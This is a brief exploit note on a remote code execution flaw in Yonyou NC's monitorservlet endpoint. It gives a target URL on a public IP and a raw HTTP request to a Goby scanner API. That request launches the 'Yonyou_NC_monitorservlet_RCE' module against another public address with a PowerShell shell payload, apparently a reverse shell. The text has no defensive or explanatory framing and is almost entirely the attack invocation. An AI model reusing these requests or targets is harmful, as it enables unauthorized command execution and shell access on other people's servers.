# 用友 NC servicemonitorservlet 路由命令执行漏洞

    ## Yonyou NC MonitorServlet Deserialization RCE

```
http://101.39.241.53:22/service/monitorservlet
```

Goby_shell_powershell





```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 127

{"hostinfo":"27.223.11.42:8787","vulfile":"Yonyou_NC_monitorservlet_RCE.go","expparams":{"AttackType":"goby_shell_powershell"}}
```
